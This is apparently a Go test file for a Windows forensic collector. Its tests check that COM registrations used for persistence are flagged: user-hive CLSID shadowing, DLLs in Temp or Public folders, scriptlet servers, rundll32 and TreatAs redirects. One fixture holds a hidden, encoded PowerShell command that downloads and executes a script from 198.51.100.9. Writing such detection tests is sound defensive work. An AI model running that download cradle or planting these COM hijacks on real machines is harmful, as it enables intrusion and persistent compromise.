package collector

import "testing"

func TestJudgeCOMQuietOnNormalRegistrations(t *testing.T) {
	normal := []comEntry{
		// Machine inproc servers in the usual places raise nothing.
		{CLSID: "{00021401-0000-0000-c000-000000000046}", Hive: "HKLM", View: "native", ServerKind: comInproc, Server: `C:\Windows\System32\shell32.dll`, Threading: "Apartment"},
		{CLSID: "{0002df01-0000-0000-c000-000000000046}", Hive: "HKLM", View: "native", ServerKind: comInproc, Server: `C:\Program Files\Internet Explorer\ieframe.dll`},
		// A per-user registration under AppData\Local that does NOT shadow a
		// machine CLSID is a normal per-app COM object (OneDrive, Teams, ...).
		{CLSID: "{9aa46009-3ce0-458a-a354-715610a075e6}", Hive: `HKU\S-1-5-21-5`, User: true, ServerKind: comInproc,
			Server: `C:\Users\alice\AppData\Local\Microsoft\OneDrive\FileSyncShell64.dll`},
		// A LocalServer32 that is an ordinary EXE.
		{CLSID: "{11111111-0000-0000-0000-000000000001}", Hive: "HKLM", View: "native", ServerKind: comLocal, Server: `"C:\Program Files\Vendor\host.exe" -Embedding`},
	}
	for _, e := range normal {
		if got := judgeCOM(e); len(got) != 0 {
			t.Errorf("%s: unexpected findings %v", e.CLSID, keys(rulesOf(got)))
		}
	}
}

func TestJudgeCOMFindsHijacks(t *testing.T) {
	cases := []struct {
		name string
		e    comEntry
		want []string
	}{
		{"user shadow, normal path",
			comEntry{CLSID: "{bcde0395-e52f-467c-8e3d-c4579291692e}", Hive: `HKU\S-1-5-21-7`, User: true, ServerKind: comInproc,
				Server: `C:\Program Files\App\helper.dll`, Shadows: true, ShadowServer: `C:\Windows\System32\mmdevapi.dll`},
			[]string{"persistence.com_hijack_user_shadow"}},
		{"user shadow with payload in temp -> critical path",
			comEntry{CLSID: "{bcde0395-e52f-467c-8e3d-c4579291692e}", Hive: `HKU\S-1-5-21-7`, User: true, ServerKind: comInproc,
				Server: `C:\Users\bob\AppData\Local\Temp\evil.dll`, Shadows: true},
			[]string{"persistence.com_hijack_user_shadow", "persistence.com_server_unusual_path"}},
		{"machine server in Public",
			comEntry{CLSID: "{22222222-0000-0000-0000-000000000002}", Hive: "HKLM", View: "native", ServerKind: comInproc,
				Server: `C:\Users\Public\x.dll`},
			[]string{"persistence.com_server_unusual_path"}},
		{"server in ProgramData is low risk",
			comEntry{CLSID: "{33333333-0000-0000-0000-000000000003}", Hive: "HKLM", View: "native", ServerKind: comInproc,
				Server: `C:\ProgramData\x\y.dll`},
			[]string{"persistence.com_server_unusual_path"}},
		{"scriptlet runtime server",
			comEntry{CLSID: "{44444444-0000-0000-0000-000000000004}", Hive: "HKLM", View: "native", ServerKind: comInproc,
				Server: `C:\Windows\System32\scrobj.dll`},
			[]string{"persistence.com_script_server"}},
		{"LocalServer32 is a LOLBin",
			comEntry{CLSID: "{55555555-0000-0000-0000-000000000005}", Hive: "HKLM", View: "native", ServerKind: comLocal,
				Server: `rundll32.exe C:\Users\Public\p.dll,Start`},
			[]string{"persistence.com_script_server", "persistence.com_server_unusual_path"}},
		{"LocalServer32 encoded PowerShell download",
			comEntry{CLSID: "{66666666-0000-0000-0000-000000000006}", Hive: "HKLM", View: "native", ServerKind: comLocal,
				Server: `powershell -nop -w hidden -enc ` + psEncode("IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.9/a')")},
			[]string{"persistence.com_script_server", "exec.powershell_encoded"}},
		{"TreatAs redirect",
			comEntry{CLSID: "{77777777-0000-0000-0000-000000000007}", Hive: "HKLM", View: "native", TreatAs: "{00000000-1111-2222-3333-444444444444}"},
			[]string{"persistence.com_treatas_redirect"}},
	}
	for _, c := range cases {
		got := rulesOf(judgeCOM(c.e))
		for _, w := range c.want {
			if _, ok := got[w]; !ok {
				t.Errorf("%s: %s missing (got %v)", c.name, w, keys(got))
			}
		}
	}
}

func TestJudgeCOMUserShadowCritical(t *testing.T) {
	e := comEntry{CLSID: "{bcde0395-e52f-467c-8e3d-c4579291692e}", Hive: `HKU\S-1-5-21-7`, User: true, ServerKind: comInproc,
		Server: `C:\Users\bob\AppData\Local\Temp\evil.dll`, Shadows: true}
	got := rulesOf(judgeCOM(e))
	f, ok := got["persistence.com_hijack_user_shadow"]
	if !ok {
		t.Fatal("user-shadow finding missing")
	}
	if f.Severity != SevCritical {
		t.Errorf("user shadow with a temp-path payload should be critical, got %s", f.Severity)
	}
}
